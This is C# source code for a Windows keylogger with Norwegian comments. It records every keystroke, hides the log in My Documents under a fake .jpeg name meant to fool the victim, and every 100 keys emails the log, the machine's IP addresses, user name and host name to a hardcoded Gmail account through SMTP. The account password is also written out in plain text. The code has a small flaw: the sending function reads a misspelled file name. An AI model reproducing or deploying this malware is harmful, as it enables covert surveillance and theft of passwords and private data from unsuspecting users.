using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace keyloggerPrem
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long NumberOfKeyStroke = 0;


        static void Main(string[] args)
        {
            //ta all tastetrykket og hvis dem I console



            string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(Filepath))
            {
                Directory.CreateDirectory(Filepath);
            }
            //Navngi filen sånn at den er ekstra skjult fra offeret
            string path = (Filepath + @"\KulPingvin.jpeg");

            //Her så lager den som en tekstfil, og ikke en "printer.dll"
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            while (true)
            {
                Thread.Sleep(5);

                //bruker 32 ASCII numbers
                for (int i = 32; i < 127; i++)
                {
                    //ta all tastetrykket og hvis dem I console
                    int KeyState = GetAsyncKeyState(i);
                    if (KeyState == 32769)
                    {
                        Console.Write((char)i + ", ");
                        //Send tastetrykket til en textfile

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }

                        NumberOfKeyStroke++;

                        //send hver 100 bokstav/tall
                        if (NumberOfKeyStroke % 100 == 0)
                        {
                            SendMessageToMail();
                        }


                    }
                }
            } //main

            static void SendMessageToMail()
            {
                //Sende til en mail konto

                string foldername = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string filepath = foldername + @"\KulPingiv.jpeg";

                string logContens = File.ReadAllText(filepath);

                string emailBody = "";

                //Lag en email melding

                DateTime now = DateTime.Now;
                string subject = "Keylogger message";

                var host = Dns.GetHostEntry(Dns.GetHostName());

                foreach (var address in host.AddressList)
                {
                    emailBody += "address: " + address;
                }

                emailBody += "\n User: " + Environment.UserDomainName + "\\" + Environment.UserName;
                emailBody += "\nhost" + host;
                emailBody += "\ntime" + now;
                emailBody += logContens;

                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);

                MailMessage mailMessage = new MailMessage();

                mailMessage.From = new MailAddress("ungasmunga@gmail.com");
                mailMessage.To.Add("ungasmunga@gmail.com");
                mailMessage.Subject = subject;
                client.UseDefaultCredentials = false;
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("ungasmunga@gmail.com", "premprem");
                mailMessage.Body = emailBody;

                client.Send(mailMessage);

            }
        }
    }
}
